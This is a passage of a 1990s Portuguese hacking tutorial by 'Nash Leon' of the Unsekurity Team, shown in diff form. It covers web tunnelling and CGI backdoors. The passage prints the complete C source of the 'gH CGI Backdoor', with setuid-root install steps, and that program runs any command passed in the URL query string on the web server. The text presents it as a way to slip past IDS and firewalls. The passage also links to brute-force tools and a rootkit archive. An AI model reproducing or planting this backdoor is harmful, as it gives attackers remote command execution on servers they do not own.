+                 "<BODY>\n<H1>File Not Found</H1>\n</BODY></HTML>\n", 0);
+        close S;
+        print STDOUT "Warning! Illegal server access!\n";   # report to user
+        goto YOP;
+} # END OF HIDE_AS_BROKEN_WEBSERVER FUNCTION
+
+# END OF PROGRAM # (c) 1998 by <vh@reptile.rug.ac.be>
+
+
+-----------------------------------------------------------------------------
+
+Tomei a liberdade para publicar o programa acima para que voce possa
+visualizar o Conceito sobre Tunelamento em WWW.Existe outro programa muito
+difundido na Internet que tambem utiliza o mesmo conceito que eh o 
+'HTTP Tunel', nao consegui encontrar um link p/ o mesmo no momento, como
+outros tutoriais estao a caminho, caso queira, passe no Forum do
+Unsekurity Team daqui ha algum tempo que assim que eu achar eu boto um
+link para o mesmo lah.
+
+
+3.2. - Backdoor em CGI.
+------------------------
+
+O conceito de tunelamento em WWW eh mesmo algo fantastico, mas existem
+esquemas melhores e dependendo do servidor, uma backdoor em CGI pode ser
+uma bela opcao, nao chamando a atencao de um IDS ou de um Firewall.Como
+sabemos, os CGIs sao programas responsaveis pela execucao e automacao de
+varias tarefas para um Servidor WEB, ou seja, envio de formularios, banco
+de dados e etc.. A criacao de uma Backdoor em CGI eh bem simples, sendo
+possivel sua implementacao em varios casos.Abaixo segue uma backdoor em
+CGI feita pelo grupo Global Hell(gH):
+
+------------------------------  gH-cgi.c ---------------------------------
+/*
+ * gH CGI Backdoor 1.0
+ *
+ * Install:
+ * -------------------------------
+ *   % gcc -o gH.cgi gH-cgi.c
+ *   % chown root.root gH.cgi
+ *   % chmod 4755 gH.cgi
+ * -------------------------------
+ * Tested with apache 1.3.4
+ *
+ * Note: place gH.cgi in a cgi-bin directory
+ *
+ *      blasphemy (cornoil@netscape.net)
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define TITLE   "gH CGI Backdoor"
+
+char x2c(char *what);
+int header();
+int footer();
+
+int
+main() {
+   FILE *out;
+   char *qs = (char *)malloc(256);
+   int x = 0, i = 0, c = 0, f = 0;
+        qs = getenv("QUERY_STRING");
+        if (qs != NULL) {
+                for (x = 0, i = 0; qs[i]; x++, i++) {
+                        if ((qs[x] = qs[i]) == '%') {
+                                qs[x] = x2c(&qs[i + 1]);
+                                i += 2;
+                          }
+                  }
+                qs[x] = '\0';
+                for (x = 0; qs[x]; x++) {
+                        if (qs[x] == '+') {
+                                qs[x] = ' ';
+                          }
+                  }
+                header(qs);
+                out = popen(qs, "r");
+                if (out != NULL) {
+                        while (c != EOF) {
+                                c = fgetc(out);
+                                if (c != EOF && c != '\0') {
+                                        printf("%c", (char) c);
+                                        f++;
+                                  }
+                          }
+                        pclose(out);
+                }
+                if (f == 0 && strcmp(qs, "") != 0)
+                        printf("gH: %s: command not found\n", qs);
+        }
+        footer();
+   return(0);
+
+}
+
+char x2c(char *what)
+{
+  register char digit;
+
+  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
+  digit *= 16;
+  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
+  return (digit);
+}
+
+int
+header(char *qs) {
+        printf("Content-type: text/html\n\n");
+        printf("<html>\n<head><title>%s</title></head>\n", TITLE);
+        printf("<body bgcolor=\"#ffffff\">\n");
+        printf("<dir><h1>%s</h1>\n", TITLE);
+        printf("<ISINDEX prompt=\"Command to Execute: \">\n");
+        printf("<br><b>Command output:</b> [<em>%s</em>]\n", qs);
+        printf("<br><pre>\n");}
+
+int
+footer() {
+        printf("</pre>\n</dir>\n</body></html>\n");
+}
+
+---------------------------------------------------------------------------
+
+Na realidade o que o CGI acima faz eh receber parametros(QUERY_STRING) e
+executa-los atraves de um processo popen().Num futuro proximo, num txt mais 
+detalhado sobre CGIs abordaremos formas de como se construir backdoors em 
+outros tipos de CGIs, fique atento! Uma backdoor em CGI mais completa segue 
+na parte 'Links e Referencias' no item final deste arquivo texto.
+
+---------------
+4 - TERMINANDO |
+---------------
+
+Existe muito a ser dito sobre Hacking de WEB, mas neste artigo basico eu
+vou parando por aqui.Novos tutoriais estao a caminho e assim que forem
+publicados, poderemos avancar juntos na implementacao e automacao das
+tecnicas descritas neste artigo.Um Administrador de Rede deve estar ciente
+dos perigos que a sua rede corre atraves da abertura do seu Servidor WEB.
+E um fucador deve procurar conhecer em detalhes as tecnicas usadas para
+tirar vantagem atraves dos furos e problemas existentes num Servidor WEB.
+Estude, persista que voce vai chegar lah!
+
+4.1 - Links e Referencias
+--------------------------
+
+* Sobre Vulnerabilidades no Servidor:
+
++ Enumeracao e Furos:
+
+http://packetstorm.securify.com/
+http://www.securityfocus.com/
+http://www.technotronic.com/
+http://www.insecure.org/nmap -> Ferramenta Nmap.
+http://www.l0pht.com/netcat  -> Ferramenta NetCat.
+http://self-evident.com/     -> Ferramenta VeteScan.
+
++ Problemas com CGIs e HTML:
+
+http://www.absoluta.org/cgi/cgi_seguro.htm -> Seguranca de CGI.
+http://www.absoluta.org/cgi/cgi_ssi.htm -> Problemas com SSI.
+http://hackersclub.com/km/files/c_scripts/Cgichk.c -> Scanner de CGI.
+
++ Brutal Forces:
+
+http://rootshell.com/archive-j457nxiqi3gq59dv/199707/brute_web.c.html
+http://hackersclub.com/km/files/hfiles/wcrk20.zip
+
+* Sobre Backdoors:
+
+http://packetstorm.securify.com/UNIX/penetration/rootkits/gH-cgi.c
+
+* Home Page Atual do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+
+* Outros Sites Interessantes:
+
+http://www.bufferoverflow.org/
+http://www.absoluta.org/
+http://www.taldowin.com.br/
+http://www.securenet.com.br/
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Escrever um texto eh trabalhoso mas compensador.Disponibilizar informacoes
+eh ir de encontro a varios conceitos e pessoas que defendem estes conceitos.
+O Unsekurity Team vem amadurecendo e se firmando ao longo desses poucos e
+rapidos 7 meses(novo, nao??) gracas a sua filosofia dominante que eh a
+'Liberdade' em seu sentido amplo da palavra.Temos muito a fazer e trabalhar
+ainda, existem muitos conceitos a serem combatidos e muita informacao a
+ser discutida e liberada.Sempre acreditei no potencial de cada um dos
+membros do Unsekurity Team e sempre acreditarei!! Por isso, meu
+agradecimento vai a todos do Unsekurity Team e que todos nos, Unsekurity
+Team, bravos leitores e fucadores eticos possamos crescer juntos e nos
+unirmos cada vez mais em prol da 'LIBERDADE DE INFORMACAO'!
+
+Um abraco.
+
+						 Nash Leon.
+
+
+-------------------------------- EOF ------------------------------------
